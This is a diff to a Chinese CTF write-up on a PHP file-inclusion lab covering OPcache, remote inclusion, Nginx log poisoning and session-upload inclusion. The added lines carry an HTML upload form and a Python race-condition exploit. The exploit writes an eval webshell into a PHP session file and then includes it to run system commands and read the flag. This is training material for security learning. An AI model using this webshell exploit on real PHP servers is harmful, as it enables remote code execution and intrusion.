@@ -44,11 +44,16 @@ DockerFile 还有后续关卡根据后面课程情况更新（ 还在想怎么�
 - Level 19:opcache缓存
     Modified From: [湖湘杯2020] 题目名字不重要反正题挺简单的
     OPcache会在特定的目录缓存编译后的PHP文件，以达到在你下次访问的时候直接调用缓存中的字节码以提高响应速度 —— 利用这一特性，如果我们复写缓存文件为恶意代码，那么下次调用的时候就会执行恶意代码。  
-    当然在文件包含的这个关卡，我们只是简要的利用他会生成 filename.type.bin 这一特性去读取文件。  
+    
+- 当然在文件包含的这个关卡，我们只是简要的利用他会生成 filename.type.bin 这一特性去读取文件。 
+  
+  
     具体的细节师傅们可以自行了解，你也可以通过修改该靶场的文件来搭建复写类型的RCE漏洞。  
+    
     [F12 - opcache导致的RCE复现 ](https://www.cnblogs.com/F12-blog/p/18001985)  
+    
     [笑花大王 - php7的Opcache getshell](https://www.cnblogs.com/xhds/p/13239331.html)
-
+    
 - Level 20: pearcmd.php 
     选自P牛2021年的文章中 0x06 pearcmd.php的巧妙利用 ：https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
 
@@ -378,7 +383,7 @@ function hello_ctf($filename,$data){
 
 ### Level 12 LFI&&RFI
 
-LFI - Local File Inclusion, 本地文件包含: 打开并包含本地文件的行为,比如我们后面会接触的日志文件包含，session文件包含，FilterChain等等。
+**本地文件包含(LFI,Local File Inclusion)** : 打开并包含本地文件的行为,比如我们后面会接触的日志文件包含，session文件包含，FilterChain等等。
 
 本地文件包含是最常见的文件包含漏洞，在前面关卡中几乎所有的演示都是LFI（比如包含phpinfo.txt，backdoor.txt这样的行为）。
 
@@ -387,6 +392,19 @@ try ?wrappers=https://gitee.com/Probius/PHPinclude-labs/raw/main/RFI
 RFI-  Remote File Inclusion,远程文件包含: 读取并执行远程服务器上文件的行为，相比于LFI，远程服务器上文件的可控性更高，因此危害更高，但代价就是条件苛刻，十分依赖 allow_url_include 参数。 HTTP/HTTPS 协议是最直观的远程文件包含形式，当然一定意义上，使用data协议去生成字符串然后包含也是一种远程文件包含。
 
 ### Level 13 LFI_日志文件包含\_Nginx
+
+在wrappers被过滤的情况下，通常使用日志文件包含的方式来绕过，由于文件包含漏洞最大的需求点是文件，所以我们需要得知日志文件的位置，通常情况下为默认位置。
+
+```
++ /var/log/nginx/     - 默认Nginx日志目录
++ + /var/log/nginx/access.log
+```
+
+该关卡的Dockerfile对于日志的配置为：VOLUME ["/var/log/nginx"]
+
+
+
+
 
 访问日志文件，可以成功读取
 
@@ -408,17 +426,74 @@ bp抓包尝试user-agent注入phpinfo成功
 
 这个漏洞可以有两种利用，为了方便两种利用方式应该都可以实现
 
-1.利用原本的cookie 
+```html
+<!doctype html>
+<html>
+<body>
+<form action="http://URL/index.php" method="post" enctype="multipart/form-data">
+    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" vaule="<?php phpinfo();?>" />
+    <input type="file" name="file1" />
+    <input type="file" name="file2" />
+    <input type="submit" />
+</form>
+</body>
+</html>
+```
 
-注入一句话木马如之前
+默认位置：/var/lib/sessions/sess_{PHPSESSID}
 
-利用原本的cookie index.php?file=/var/lib/sessions/Cookie
+/var/lib/sessions/sess_hello
 
-蚁剑链接
+exp:
 
-2.注入cookie 
+```python
+import io
+import sys
+import requests
+import threading
 
-cookie editor 注入一个cookie 然后如1
+sessid = 'mixian'
+
+
+def POST(session):
+    while True:
+        f = io.BytesIO(b'a' * 1024 * 50)
+        session.post(
+            'http://core.hello-ctf.com:34292/index.php',
+            data={
+                "PHP_SESSION_UPLOAD_PROGRESS": "<?php @eval($_POST[cmd]);fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');?>"},
+            files={"file": ('q.txt', f)},
+            cookies={'PHPSESSID': sessid}
+        )
+
+
+def READ(session):
+    while True:
+
+        data={
+            "cmd" : "system('cat /flag');"
+
+        }
+        response = session.post(f"http://core.hello-ctf.com:34292/index.php?file=/var/lib/sessions/sess_b928ce6bbd1bea764e24d855011f9ed7",data=data)
+
+
+        if 'flag{' not in response.text:
+            print(response.text)
+        else:
+            print(response.text)
+            sys.exit(0)
+
+
+with requests.session() as session:
+    t1 = threading.Thread(target=POST, args=(session,))
+    t1.daemon = True
+    t1.start()
+
+    READ(session)
+
+```
+
+
 
 ###  Level 16 FilterChain:THE_END_OF_LFI
 
